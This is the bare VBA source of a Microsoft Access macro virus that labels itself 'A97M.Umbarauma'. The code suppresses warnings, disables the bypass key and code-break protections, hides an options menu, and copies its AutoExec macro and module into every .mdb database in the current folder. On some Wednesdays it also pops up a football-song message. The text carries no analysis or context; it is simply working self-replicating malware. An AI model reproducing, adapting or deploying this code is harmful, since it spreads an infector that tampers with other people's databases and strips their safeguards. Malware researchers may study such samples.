   Function infectme()
   Randomize: Dim WeInfect, FilePath, MyNameIs, NewHost, ToInfect
   Const Zero = 0, FileID = "*.mdb", OurApp = "Microsoft Access", MacroName = "AutoExec"
   On Error Resume Next
   DoCmd.SetWarnings (Zero)
   SetOption "Show Hidden Objects", (Rnd * Zero)
   CommandBars("Tools").Controls("Optionen...").Enabled = (Rnd * Zero)
   CurrentDb.CreateProperty "AllowSpecialKeys", , (Rnd * Zero)
   CurrentDb.CreateProperty "AllowBreakIntoCode", , (Rnd * Zero)
   CurrentDb.CreateProperty "AllowBypassKey", , (Rnd * Zero)
   WeInfect = False
   If Len(CurDir) = 3 Then FilePath = CurDir Else FilePath = CurDir & "\"
   MyNameIs = CurrentDb.Name
   NewHost = Dir(FilePath & FileID)
   If NewHost <> "" Then ToInfect = FilePath & NewHost
   If MyNameIs = ToInfect Then WeInfect = True
   If WeInfect = False Then
   Application.DoCmd.TransferDatabase acExport, OurApp, ToInfect, acMacro, MacroName, MacroName
   Application.DoCmd.TransferDatabase acExport, OurApp, ToInfect, acModule, ModuleName, ModuleName
   End If
   Do
   WeInfect = False
   NewHost = Dir()
   If NewHost <> "" Then ToInfect = FilePath & NewHost
   If MyNameIs = ToInfect Then WeInfect = True
   If WeInfect = False Then
   Application.DoCmd.TransferDatabase acExport, OurApp, ToInfect, acMacro, MacroName, MacroName
   Application.DoCmd.TransferDatabase acExport, OurApp, ToInfect, acModule, ModuleName, ModuleName
   End If
   Loop While NewHost <> ""
   If WeekDay(Now()) = vbWednesday And Int(Rnd * 2) = Zero Then MsgBox "Un, dois, trés, quatro..." & vbCr & vbCr & "Umbabarauma  homen gol" & vbCr & "Umbabarauma  homen gol" & vbCr & vbCr & "Joga bola  joga bola  jogador" & vbCr & "Joga bola  quero jogar bola  jogador" & vbCr & "Pula, pula, cai, levanta, sobe e desce" & vbCr & "Corre, chuta, abre espaco, vibra e agradece" & vbCr & "Olha que a cidade toda ficou vazia" & vbCr & "Nessa tarde bonita pra te ver jogar" & vbCr & vbCr & "Joga bola  jogador" & vbCr & "Joga bola  corocondo" & vbCr & vbCr & "Favela  Pelada  Favela  Pelada" & vbCr & vbCr & "Futebol  Futebol  Futebol  Futebol" & vbCr & vbCr & "  ¸.·´¯`·.¸¸.·´¯`·.¸¸.·´¯`·.¸¸.·´¯`·.¸¸.·´¯`·.¸" & vbCr & "To all my football friends / jackie-" & vbCr & "  ¸.·´¯`·.¸¸.·´¯`·.¸¸.·´¯`·.¸¸.·´¯`·.¸¸.·´¯`·.¸", vbInformation, "A97M.Umbarauma"
